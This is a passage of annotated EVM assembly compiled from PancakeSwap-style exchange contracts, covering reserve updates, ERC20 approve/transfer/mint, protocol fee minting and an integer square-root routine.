UQ112x112.encode(_reserve1) */\n      jump\t// in\n    tag_339:\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3577  UQ112x112.encode(_reserve1).uqdiv */\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3588  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3577  UQ112x112.encode(_reserve1).uqdiv */\n      tag_341\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3544:3588  UQ112x112.encode(_reserve1).uqdiv(_reserve0) */\n      and\n      jump\t// in\n    tag_338:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3499:3519  price0CumulativeLast */\n      0x0c\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3499:3619  price0CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3539:3589  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3539:3619  uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3499:3619  price0CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3673:3753  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      0xffffffff\n      dup2\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3722  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n      tag_342\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3712:3721  _reserve1 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3705  UQ112x112.encode(_reserve0) */\n      tag_339\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3695:3704  _reserve0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3694  UQ112x112.encode */\n      tag_340\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3705  UQ112x112.encode(_reserve0) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3678:3722  UQ112x112.encode(_reserve0).uqdiv(_reserve1) */\n    tag_342:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3633:3653  price1CumulativeLast */\n      0x0d\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3633:3753  price1CumulativeLast +=... */\n      dup1\n      sload\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3673:3723  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) */\n      swap3\n      swap1\n      swap3\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3673:3753  uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) *... */\n      swap3\n      swap1\n      swap3\n      mul\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3633:3753  price1CumulativeLast +=... */\n      add\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3368:3764  if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {... */\n    tag_337:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3773:3781  reserve0 */\n      0x0b\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3773:3801  reserve0 = uint112(balance0) */\n      dup1\n      sload\n      not(0xffffffffffffffffffffffffffff)\n      and\n      sub(shl(0x70, 0x01), 0x01)\n      dup9\n      dup2\n      and\n      swap2\n      swap1\n      swap2\n      or\n      not(shl(0x70, 0xffffffffffffffffffffffffffff))\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3811:3839  reserve1 = uint112(balance1) */\n      and\n      shl(0x70, 0x01)\n      dup9\n      dup4\n      and\n      dup2\n      mul\n      swap2\n      swap1\n      swap2\n      or\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3849:3884  blockTimestampLast = blockTimestamp */\n      and\n      shl(0xe0, 0x01)\n      0xffffffff\n      dup8\n      and\n      mul\n      or\n      swap3\n      dup4\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3899:3923  Sync(reserve0, reserve1) */\n      0x40\n      dup1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3904:3912  reserve0 */\n      dup5\n      dup5\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3899:3923  Sync(reserve0, reserve1) */\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3914:3922  reserve1 */\n      swap2\n      swap1\n      swap4\n      div\n      swap1\n      swap2\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":3899:3923  Sync(reserve0, reserve1) */\n      0x20\n      dup3\n      add\n      mstore\n      dup2\n      mload\n      0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\n      swap3\n      swap2\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2947:3930  function _update(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_183:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2544  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2551  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2560  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2535:2568  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2583:2614  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2452:2621  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n    tag_190:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2732  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2738  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      tag_346\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2743:2748  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2742  balanceOf[from].sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2723:2749  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_346:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2714  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2720  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2705:2749  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2788  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      tag_347\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2793:2798  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2792  balanceOf[to].add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2775:2799  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_347:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2768  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2799  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2759:2772  balanceOf[to] */\n      swap2\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2814:2839  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2627:2846  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4016:4916  function _mintFee(... */\n    tag_204:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4111:4121  bool feeOn */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4133:4146  address feeTo */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4165:4172  factory */\n      0x07\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4179  IPancakeFactory(factory).feeTo */\n      and\n      0x017e7e58\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_350\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_350:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_351\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_351:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_352\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_352:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4242:4247  kLast */\n      sload(0x0e)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4199:4218  feeTo != address(0) */\n      dup3\n      and\n      iszero\n      dup1\n      iszero\n      swap5\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4149:4181  IPancakeFactory(factory).feeTo() */\n      swap2\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4242:4247  kLast */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4272:4910  if (feeOn) {... */\n      tag_353\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4301:4312  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4297:4843  if (_kLast != 0) {... */\n      tag_354\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4332:4342  uint rootK */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4345:4386  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      tag_355\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4385  uint(_reserve0).mul(_reserve1) */\n      tag_208\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4370  uint(_reserve0) */\n      dup9\n      dup2\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4385  uint(_reserve0).mul(_reserve1) */\n      dup9\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4374  uint(_reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4355:4385  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4345:4386  Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n    tag_355:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4332:4386  uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1)) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4404:4418  uint rootKLast */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4421:4438  Math.sqrt(_kLast) */\n      tag_357\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4431:4437  _kLast */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4421:4430  Math.sqrt */\n      tag_209\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4421:4438  Math.sqrt(_kLast) */\n      jump\t// in\n    tag_357:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4404:4438  uint rootKLast = Math.sqrt(_kLast) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4468:4477  rootKLast */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4460:4465  rootK */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4460:4477  rootK > rootKLast */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4456:4829  if (rootK > rootKLast) {... */\n      iszero\n      tag_358\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4501:4515  uint numerator */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4608  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      tag_359\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4585:4586  8 */\n      0x08\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4555  totalSupply.mul(rootK.sub(rootKLast)) */\n      tag_175\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4554  rootK.sub(rootKLast) */\n      tag_361\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4539  rootK */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4544:4553  rootKLast */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4554  rootK.sub(rootKLast) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4543  rootK.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4534:4554  rootK.sub(rootKLast) */\n      and\n      jump\t// in\n    tag_361:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4529  totalSupply */\n      sload(0x00)\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4555  totalSupply.mul(rootK.sub(rootKLast)) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4533  totalSupply.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4555  totalSupply.mul(rootK.sub(rootKLast)) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4518:4608  totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n    tag_359:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4501:4608  uint numerator = totalSupply.mul(rootK.sub(rootKLast)).mul(... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4630:4646  uint denominator */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4684  rootK.mul(17).add(rootKLast.mul(8)) */\n      tag_362\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4683  rootKLast.mul(8) */\n      tag_363\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4676  rootKLast */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4681:4682  8 */\n      0x08\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4683  rootKLast.mul(8) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4680  rootKLast.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4667:4683  rootKLast.mul(8) */\n      and\n      jump\t// in\n    tag_363:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4662  rootK.mul(17) */\n      tag_364\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4654  rootK */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4659:4661  17 */\n      0x11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4662  rootK.mul(17) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4658  rootK.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4662  rootK.mul(17) */\n      and\n      jump\t// in\n    tag_364:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4666  rootK.mul(17).add */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4684  rootK.mul(17).add(rootKLast.mul(8)) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4666  rootK.mul(17).add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4649:4684  rootK.mul(17).add(rootKLast.mul(8)) */\n      and\n      jump\t// in\n    tag_362:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4630:4684  uint denominator = rootK.mul(17).add(rootKLast.mul(8)) */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4706:4720  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4735:4746  denominator */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4723:4732  numerator */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4723:4746  numerator / denominator */\n      dup2\n      tag_365\n      jumpi\n      invalid\n    tag_365:\n      div\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4772:4785  liquidity > 0 */\n      dup1\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4768:4810  if (liquidity > 0) _mint(feeTo, liquidity) */\n      tag_367\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4787:4810  _mint(feeTo, liquidity) */\n      tag_367\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4793:4798  feeTo */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4800:4809  liquidity */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4787:4792  _mint */\n      tag_211\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4787:4810  _mint(feeTo, liquidity) */\n      jump\t// in\n    tag_367:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4456:4829  if (rootK > rootKLast) {... */\n      pop\n      pop\n      pop\n    tag_358:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4297:4843  if (_kLast != 0) {... */\n      pop\n      pop\n    tag_354:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4272:4910  if (feeOn) {... */\n      jump(tag_369)\n    tag_353:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4863:4874  _kLast != 0 */\n      dup1\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4859:4910  if (_kLast != 0) {... */\n      tag_369\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4898:4899  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4890:4895  kLast */\n      0x0e\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4890:4899  kLast = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4859:4910  if (_kLast != 0) {... */\n    tag_369:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":4016:4916  function _mintFee(... */\n      pop\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n    tag_209:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":400:409  uint256 z */\n      0x00\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":429:430  3 */\n      0x03\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":425:426  y */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":425:430  y > 3 */\n      gt\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":421:647  if (y > 3) {... */\n      iszero\n      tag_371\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":450:451  y */\n      dup1\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":485:486  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":481:482  2 */\n      0x02\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":477:482  y / 2 */\n      dup3\n      div\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":477:486  y / 2 + 1 */\n      add\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":500:589  while (x < z) {... */\n    tag_373:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":511:512  z */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":507:508  x */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":507:512  x < z */\n      lt\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":500:589  while (x < z) {... */\n      iszero\n      tag_374\n      jumpi\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":536:537  x */\n      dup1\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":532:537  z = x */\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":573:574  2 */\n      0x02\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":568:569  x */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":564:565  x */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":560:561  y */\n      dup6\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":560:565  y / x */\n      dup2\n      tag_375\n      jumpi\n      invalid\n    tag_375:\n      div\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":560:569  y / x + x */\n      add\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":559:574  (y / x + x) / 2 */\n      dup2\n      tag_376\n      jumpi\n      invalid\n    tag_376:\n      div\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":555:574  x = (y / x + x) / 2 */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":500:589  while (x < z) {... */\n      jump(tag_373)\n    tag_374:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":421:647  if (y > 3) {... */\n      pop\n      jump(tag_378)\n    tag_371:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":609:615  y != 0 */\n      dup2\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":605:647  if (y != 0) {... */\n      tag_378\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":635:636  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":605:647  if (y != 0) {... */\n    tag_378:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":352:653  function sqrt(uint256 y) internal pure returns (uint256 z) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1550:1750  function _mint(address to, uint256 value) internal {... */\n    tag_211:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1636  totalSupply */\n      sload(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1647  totalSupply.add(value) */\n      tag_380\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1641:1646  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1647  totalSupply.add(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1640  totalSupply.add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1625:1647  totalSupply.add(value) */\n      and\n      jump\t// in\n    tag_380:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1611:1622  totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1611:1647  totalSupply = totalSupply.add(value) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1686  balanceOf[to] */\n      dup4\n      and\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1682  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1686  balanceOf[to] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1697  balanceOf[to].add(value) */\n      tag_381\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1691:1696  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1673:1697  balanceOf[to].add(value) */\n      